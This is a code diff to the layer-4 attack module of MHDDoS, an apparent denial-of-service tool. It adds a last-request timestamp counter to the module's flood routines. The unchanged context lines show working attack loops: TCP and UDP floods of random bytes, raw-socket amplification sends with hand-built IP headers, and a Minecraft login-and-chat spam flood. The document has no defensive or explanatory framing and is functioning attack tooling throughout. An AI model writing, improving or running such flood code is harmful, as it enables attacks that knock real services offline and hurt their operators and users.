@@ -1,7 +1,7 @@
 """
 Implementations of layer 4 attack methods of MHDDoS.
 """
-
+import time
 from contextlib import suppress
 from itertools import cycle
 from os import urandom as randbytes
@@ -33,6 +33,7 @@ class Layer4(Thread):
     _proxies: List[Proxy] = None
     _requests_sent: Counter = None
     _bytes_sent: Counter = None
+    _last_request_timestamp: Counter = None
 
     def __init__(self,
                  target: Tuple[str, int],
@@ -41,7 +42,8 @@ class Layer4(Thread):
                  synevent: Event = None,
                  proxies: Set[Proxy] = None,
                  bytes_sent_counter: Counter = None,
-                 requests_sent_counter: Counter = None):
+                 requests_sent_counter: Counter = None,
+                 last_request_timestamp: Counter = None):
         Thread.__init__(self, daemon=True)
         self._amp_payload = None
         self._amp_payloads = cycle([])
@@ -54,6 +56,7 @@ class Layer4(Thread):
 
         self._requests_sent = requests_sent_counter
         self._bytes_sent = bytes_sent_counter
+        self._last_request_timestamp = last_request_timestamp
 
     def run(self) -> None:
         if self._synevent:
@@ -123,6 +126,7 @@ class Layer4(Thread):
                 s.connect(self._target)
                 while s.send(randbytes(1024)):
                     self._requests_sent += 1
+                    self._last_request_timestamp.set(time.time())
                     self._bytes_sent += 1024
         except Exception:
             s.close()
@@ -141,6 +145,7 @@ class Layer4(Thread):
                 while s.send(b'\x01'):
                     s.send(b'\x00')
                     self._requests_sent += 2
+                    self._last_request_timestamp.set(time.time())
                     self._bytes_sent += 2
 
         except Exception:
@@ -152,6 +157,7 @@ class Layer4(Thread):
             with socket(AF_INET, SOCK_DGRAM) as s:
                 while s.sendto(randbytes(1024), self._target):
                     self._requests_sent += 1
+                    self._last_request_timestamp.set(time.time())
                     self._bytes_sent += 1024
 
         except Exception:
@@ -165,6 +171,7 @@ class Layer4(Thread):
                 s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
                 while s.sendto(payload, self._target):
                     self._requests_sent += 1
+                    self._last_request_timestamp.set(time.time())
                     self._bytes_sent += len(payload)
 
         except Exception:
@@ -178,6 +185,7 @@ class Layer4(Thread):
                 s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
                 while s.sendto(*payload):
                     self._requests_sent += 1
+                    self._last_request_timestamp.set(time.time())
                     self._bytes_sent += len(payload[0])
 
         except Exception:
@@ -200,17 +208,20 @@ class Layer4(Thread):
                 s.send(login)
                 self._bytes_sent += (len(handshake + login))
                 self._requests_sent += 2
+                self._last_request_timestamp.set(time.time())
 
                 while s.recv(1):
                     keep = Minecraft.keepalive(randint(1000, 123456))
                     s.send(keep)
                     self._bytes_sent += len(keep)
                     self._requests_sent += 1
+                    self._last_request_timestamp.set(time.time())
                     c = 5
                     while c:
                         chat = Minecraft.chat(PyRoxyTools.Random.rand_str(255))
                         s.send(chat)
                         self._requests_sent += 1
+                        self._last_request_timestamp.set(time.time())
                         self._bytes_sent += len(chat)
                         sleep(1.2)
                         c -= 1
@@ -227,6 +238,7 @@ class Layer4(Thread):
             with socket(AF_INET, SOCK_DGRAM) as s:
                 while s.sendto(payload, self._target):
                     self._requests_sent += 1
+                    self._last_request_timestamp.set(time.time())
                     self._bytes_sent += len(payload)
         except Exception:
             s.close()
